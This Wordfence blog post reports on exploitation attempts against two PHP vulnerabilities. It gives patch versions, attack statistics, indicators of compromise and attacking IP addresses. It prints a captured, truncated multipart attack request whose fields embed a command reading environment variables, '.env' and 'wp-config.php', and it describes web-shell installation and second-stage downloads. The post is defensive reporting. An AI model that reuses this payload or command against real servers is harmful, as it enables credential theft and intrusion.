Title: Attacks on PHP2Shell Continue, But No Known Compromises as a Result Yet

URL Source: https://www.wordfence.com/blog/2026/10/attacks-on-php2shell-continue-but-no-known-compromises-as-a-result-yet/

Published Time: 2026-10-22T22:24:25+00:00

Markdown Content:
On **October 21st, 2026**, the PHP project released emergency updates for two critical vulnerabilities tracked as [CVE-2026-109618](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) and [CVE-2026-109619](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp). We [warned site owners](https://www.wordfence.com/blog/2026/10/psa-upcoming-critical-php-security-release/) before the fixes became available and [followed up after our team reviewed the vulnerability details](https://www.wordfence.com/blog/2026/10/critical-php-update-wordpress-vulnerabilities-testing/) and began testing the patched and vulnerable PHP releases. At this time, **we have not observed any confirmed compromises** resulting from these vulnerabilities, which is a clear indicator of this exploit’s complexity considering Wordfence secures over 5,000,000 WordPress websites.

Through our built-in firewall protections, the **Wordfence Firewall has already intercepted over 74,000 exploit or probing attempts** associated with the newly disclosed vulnerabilities, along with related attacks abusing the same PHP multipart and session-upload-progress surface. To better track and assess the evolving threat landscape, we are actively expanding our monitoring capabilities.

The remediation remains unchanged: install PHP **8.5.12, 8.4.27, 8.3.36 or 8.2.35**, or a vendor package explicitly confirmed to contain both fixes, and restart every PHP worker. Updating WordPress itself does not update PHP.

## The Attack Data

One of the largest clearly identifiable attack clusters uses requests like the following. The multipart body contains repeated fields carrying an apparent command-execution layout and commands that attempt to read `.env` and `wp-config.php`.

```
POST / HTTP/1.1
Connection: close
Cookie: %5Bredacted%5D=%5Bredacted%5D;
Accept-Language: en-US,en;q=0.9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Host: [redacted]
Content-Type: multipart/form-data; boundary=p2s0adf525faa
Content-Length: 63395

--p2s0adf525faa
Content-Disposition: form-data; name="PHPSESSID"

d1f6b03d7696286fe2bb0537a5
--p2s0adf525faa
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
--p2s0adf525faa
Content-Disposition: form-data; name="t[0]"

@0000000AAAAAAAA000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000AAAAAAAA00000000000000000000000000000000000000system0echo P2S_OK;env;head -c 200 .env ../.env ../../.env wp-config.php0000000000000000
--p2s0adf525faa
Content-Disposition: form-data; name="t[1]"

@0000000AAAAAAAA000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000AAAAAAAA00000000000000000000000000000000000000system0echo P2S_OK;env;head -c 200 .env ../.env ../../.env wp-config.php0000000000000000
--p2s0adf525faa
Content-Disposition: form-data; name="t[135]"
[truncated]
@0000000AAAAAAAA000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000AAAAAAAA00000000000000000000000000000000000000system0echo P2S_OK;env;head -c 200 .env ../.env ../../.env wp-config.php0000000000000000
--p2s0adf525faa
Content-Disposition: form-data; name="t[136]"

@0000000AAAAAAAA000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000AAAAAAAA00000000000000000000000000000000000000system0echo P2S_OK;env;he
--p2s0a"
```

This request is more than a generic upload probe. The repeated `t[n]` fields are consistent with an attempt to create memory pressure and shape request allocations, while the embedded `system` string and `P2S_OK` marker show an intended command-execution stage. We truncated 134 of the `t[n]` fields from the request. If successful, the example command would return environment variables and portions of common WordPress and application configuration files. The request alone does not prove that memory corruption or command execution occurred, however, it provides valuable insights as to what is being attempted.

### Exploit Families Observed

We analyzed a 10,000-event sample collected between October 20th and October 22nd. This sample was selected around requests referencing `PHP_SESSION_UPLOAD_PROGRESS`, so it should not be treated as a representative sample of all potentially malicious traffic. It nevertheless shows several distinct payload families rather than a single proof of concept.

| Observed payload family | Events | Likely objective |
| --- | --- | --- |
| P2S apparent OOM/state-corruption RCE attempts | 3,752 | Shape request allocations, attempt command execution and steal configuration data |
| Laravel serialized-object gadget-chain attempts | 1,139 | Try to invoke an available application gadget to execute a shell command |
| Other serialized-object payloads | 2,534 | Try Monolog, Symfony, Guzzle, WordPress, ThinkPHP and other installed classes |
| Related NxSP session-file poisoning attempts | 512 | Poison a temporary session file and pair it with a separate local-file-inclusion flaw |
| Related out-of-band PHP upload canaries | 30 | Test whether another upload or execution primitive causes a callback |

Serialized-object counts describe payload characteristics and may overlap other behavioral categories. The event sample contains requests, not response bodies or endpoint telemetry, so these figures measure attempted exploitation rather than successful compromise.

**Attribution matters:** The P2S and serialized-object traffic is consistent with attempts to weaponize behavior addressed by the recent PHP fixes. The NxSP session-poisoning requests and small PHP upload canaries use the same multipart or upload-progress surface, but they depend on separate flaws or application behavior and should not be described as confirmed CVE-2026-109618 or CVE-2026-109619 exploitation.

### What the attackers are trying to do

*   **Confirm command execution** using markers such as `P2S_OK`, `NxSP<number>` and `SHL_OK`.
*   **Profile the server** by running commands such as `id`, `uname -a` and `hostname`.
*   **Steal credentials and secrets** from environment variables, `.env` and `wp-config.php`.
*   **Install persistent access** by searching common CMS directories and attempting to write a PHP command shell named `wp2s.php` into writable upload, plugin or theme locations.
*   **Retrieve and execute a second-stage payload** using `curl`, `wget` and a shell interpreter.
*   **Verify execution out of band** through unique callback hostnames under services such as `oast.pro`, `oast.fun` and `oast.online`.

### Non-IP indicators for defenders

```
P2S_OK
NxSP[0-9]+
SHL_OK
ADV618BOUNDARY
----P2SB
wp2s.php
php2shell.php
axiom_*.php
php-to-shell
Illuminate\Broadcasting\PendingBroadcast
Monolog\Handler\BufferHandler
Requests_Utility_FilteredIterator
```

## Top Attacking IPs

The 20 most active source addresses below account for the largest share of blocked attempts.

| # | IP Address | Blocked attempts | Count |
| --- | --- | --- | --- |
| 1 | 87.121.84.174 |  | 8,525 |
| 2 | 181.215.186.252 |  | 7,856 |
| 3 | 185.196.220.132 |  | 7,146 |
| 4 | 185.161.210.29 |  | 5,796 |
| 5 | 152.233.51.69 |  | 5,317 |
| 6 | 45.134.225.16 |  | 3,623 |
| 7 | 107.189.14.87 |  | 2,365 |
| 8 | 193.47.62.24 |  | 2,263 |
| 9 | 2409:40d2:204e:4be:2a1f:f9c9:a055:e00b |  | 1,953 |
| 10 | 103.147.220.17 |  | 1,860 |
| 11 | 143.246.223.124 |  | 1,791 |
| 12 | 52.74.54.75 |  | 1,260 |
| 13 | 65.49.200.56 |  | 836 |
| 14 | 193.142.147.111 |  | 775 |
| 15 | 85.137.56.188 |  | 672 |
| 16 | 85.137.53.26 |  | 664 |
| 17 | 167.254.242.130 |  | 648 |
| 18 | 217.112.152.168 |  | 619 |
| 19 | 203.78.119.133 |  | 616 |
| 20 | 140.245.32.169 |  | 616 |

## Our Assessment

Exploitation remains sensitive to the PHP configuration, SAPI, loaded extensions, application classes and worker state. However, the traffic is not limited to generic or malformed probes. We are seeing purpose-built requests that combine memory-pressure techniques, serialized-object gadget chains, command-execution markers and post-exploitation actions.

The presence of these payloads does not establish that the targeted websites were successfully compromised. The request data does show clear intent to execute commands, steal configuration data, install persistent PHP access and retrieve additional payloads. Confirmation would require response, filesystem, process, worker-crash, DNS or outbound HTTP evidence from the targeted server.

These observations are consistent with our previously published testing. In a specially configured PHP 8.5.11 Apache lab, we confirmed code execution while testing CVE-2026-109619; the same proof of concept crashed a normal optimized PHP 8.5.11 build instead, while fixed PHP 8.5.12 remained healthy. For CVE-2026-109618, we reproduced the vulnerable-versus-fixed behavior but did not independently achieve code execution. The production traffic analyzed here does not change those lab results or establish a successful real-world exploit.

At this time, **we have not observed any confirmed compromises** resulting from these vulnerabilities. We are continuing to closely monitor the situation and will share additional details as they become available. The absence of a confirmed compromise in our telemetry is not evidence that an unpatched server is safe, particularly because some relevant failures and callbacks may occur outside the WordPress application and its logs. However, this is a sign of how complex the exploit actually is.

[Wordfence Care](https://www.wordfence.com/products/wordfence-care/) and [Wordfence Response](https://www.wordfence.com/products/wordfence-response/) customers can contact our incident response team if they believe a site may have been compromised. Wordfence Response provides 24/7/365 availability with a one-hour response time.

If you know someone who manages WordPress sites, please share this article and ask them to verify the PHP service behind each site.

📨 If you have a website, or know of someone whose website has been compromised through one of these vulnerabilities, please email [samples@wordfence.com](mailto:samples@wordfence.com) with any relevant artifacts and details you can provide. This information will help us keep the community informed, improve our protections, and better protect website owners.

Links/Buttons:
- [Get Help](https://www.wordfence.com/wordfence-site-cleanings/?promo_id=top-get-help&promo_name=get-site-clean&promo_creative=yellow-txt&promo_position=sw-top)
- [Create Account](https://www.wordfence.com/wp-login.php?action=register)
- [Sign In](https://www.wordfence.com/wp-login.php)
- [](https://trust.defiant.com/)
- [Products](https://www.wordfence.com/products/)
- [Wordfence Free](https://www.wordfence.com/products/wordfence-free/)
- [Wordfence Premium](https://www.wordfence.com/products/wordfence-premium/)
- [Wordfence Care](https://www.wordfence.com/products/wordfence-care/)
- [Wordfence Response](https://www.wordfence.com/products/wordfence-response/)
- [Wordfence CLI](https://www.wordfence.com/products/wordfence-cli/)
- [Wordfence Intelligence](https://www.wordfence.com/products/wordfence-intelligence/)
- [Wordfence Central](https://www.wordfence.com/products/wordfence-central/)
- [Compare Plans](https://www.wordfence.com/products/pricing/)
- [Intelligence](https://www.wordfence.com/threat-intel/)
- [All Vulnerabilities](https://www.wordfence.com/threat-intel/vulnerabilities/)
- [Plugins](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/)
- [Themes](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-themes/)
- [WordPress Core](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/)
- [Researchers](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/)
- [Overview](https://www.wordfence.com/threat-intel/vendor/vulnerability-management-portal/)
- [Submit Vulnerability](https://www.wordfence.com/threat-intel/vulnerabilities/submit/)
- [Register](https://www.wordfence.com/threat-intel/vendor/register/)
- [Access Dashboard](https://www.wordfence.com/researcher-dashboard/)
- [Access Portal](https://www.wordfence.com/threat-intel/vendor/portal/)
- [API Access](https://www.wordfence.com/help/wordfence-intelligence/v3-accessing-and-consuming-the-vulnerability-data-feed/)
- [Webhook Integration](https://www.wordfence.com/help/wordfence-intelligence/wordfence-intelligence-webhook-notifications/)
- [Support](https://www.wordfence.com/help/)
- [Learning Center](https://www.wordfence.com/learn/)
- [Free Support](https://wordpress.org/support/plugin/wordfence/)
- [Premium Support](https://support.wordfence.com/)
- [News](https://www.wordfence.com/blog/)
- [In The News](https://www.wordfence.com/news/)
- [WP Security Mailing List](https://www.wordfence.com/subscribe-to-the-wordfence-email-list/)
- [Vulnerability Advisories](https://www.wordfence.com/vulnerability-advisories/)
- [About](https://www.wordfence.com/about-wordfence/)
- [Employment](https://www.wordfence.com/employment/)
- [Security](https://www.wordfence.com/security/)
- [CVE Request Form](https://www.wordfence.com/request-cve/)
- [Contact](https://www.wordfence.com/contact/)
- [Privacy Policy](https://www.wordfence.com/privacy-policy)
- [Terms of Service](https://www.wordfence.com/terms-of-service/)
- [Chloe Chamberland](https://www.wordfence.com/blog/author/wfchloe/)
- [CVE-2026-109618](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [CVE-2026-109619](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [warned site owners](https://www.wordfence.com/blog/2026/10/psa-upcoming-critical-php-security-release/)
- [followed up after our team reviewed the vulnerability details](https://www.wordfence.com/blog/2026/10/critical-php-update-wordpress-vulnerabilities-testing/)
- [samples@wordfence.com](mailto:samples@wordfence.com)
- [Facebook](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2026%2F10%2Fattacks-on-php2shell-continue-but-no-known-compromises-as-a-result-yet%2F)
- [X (Twitter)](https://x.com/share?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2026%2F10%2Fattacks-on-php2shell-continue-but-no-known-compromises-as-a-result-yet%2F&text=Attacks%20on%20PHP2Shell%20Continue%2C%20But%20No%20Known%20Compromises%20as%20a%20Result%20Yet&via=wordfence)
- [LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2026%2F10%2Fattacks-on-php2shell-continue-but-no-known-compromises-as-a-result-yet%2F)
- [Affiliate Program](https://www.wordfence.com/affiliate/)
- [Cookie Policy](https://www.wordfence.com/cookies-notice)
- [privacy@defiant.com](mailto:privacy@defiant.com)
